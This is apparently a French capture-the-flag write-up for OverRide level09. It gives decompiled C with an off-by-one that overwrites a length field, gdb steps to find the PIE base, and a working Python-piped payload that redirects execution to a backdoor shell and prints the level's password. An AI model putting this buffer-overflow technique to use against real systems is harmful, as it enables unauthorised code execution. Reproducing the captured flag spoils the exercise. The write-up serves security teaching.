# Level 09

Voici le code source de ce niveau:

```C
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct
{
    char msg[140];
    char username[40];
    int len;
} userinfo_t;

void secret_backdoor(void)
{
    char buff[128];

    fgets(buff, 128, stdin);
    system(buff);
}

void set_msg(char *msg)
{
    char buff[1024];

    memset(buff, 0, 128);
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(buff, 1024, stdin);
    strncpy(msg, buff, (long)*(int*)(msg + 180));
}

void set_username(long offset)
{
    char buff[140];

    memset(buff, 0, 128);
    puts(">: Enter your username");
    printf(">>: ");
    fgets(buff, 0x80, stdin);
    for (int i = 0; i < 41 && buff[i] != '\0'; i++)
        *(char *)(offset + 140 + i) = buff[i];
    printf(">: Welcome, %s", (char *)offset + 140);
}

void handle_msg(void)
{
    userinfo_t info;

    info.len = 140;
    set_username((long)info.msg);
    set_msg(info.msg);
    puts(">: Msg sent!");
}

int main(void)
{
    puts(
        "--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n--------------------------------------------"
        );
    handle_msg();
    return 0;
}
```

L'idee ici est d'ecraser l'adresse de retour de `set_msg()` pour executer `secret_backdoor()`. D'abord voici l'adresse de notre fonction `secret_backdoor()`. La difference est que dans ce niveau le PIE est active donc `objdump` ou `gdb` ne nous donneront pas les adresses absolue mais seulement les offset par rapport a l'adresse de base du binaire. Pour contourner cela et avoir l'adresse de `secret_backdoor()` nous pouvons utiliser gdb:

```bash
level09@OverRide:~$ gdb ./level09
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x88c <secret_backdoor>
(gdb) break main
Breakpoint 1 at 0xaac
(gdb) run
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info proc mappings
process 2127
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /home/users/level09/level09
```

Maintenant nous pouvons faire `0x88c + 0x555555554000` pour obtenir l'adresse de `secret_backdoor()`: `0x55555555488c`

Nous allons donc devoir ecraser l'adresse de retour de `set_msg()` par cette valeur. Pour ceci nous allons devoir modifier la valeur de `len` faisant overflow le username etant donne que la copie n'est pas protegee. Voici donc la premiere partie de notre payload:

```bash
level09@OverRide:~$ python -c 'print "A" * 40 + "\xff"' | ./level09
```

Ensuite nous avons juste a faire un `NOP-Sled` pour changer l'adresse de retour de `set_msg()` sans connaitre l'offset precis a partir duquel ecrire notre adresse de retour:

```bash
python -c 'print "\x90" * 100 + "\x8c\x48\x55\x55\x55\x55\x00"'
```

> __*NOTE:*__ Le `\x00` ici est tres important il nous permet de combler le reste de l'adresse de retour par des 0 pour faire 8-octets

Nous pouvons maintenant combiner les deux parties:

```bash
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff"'; python -c 'print "\x90" * 200 + "\x8c\x48\x55\x55\x55\x55\x00"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
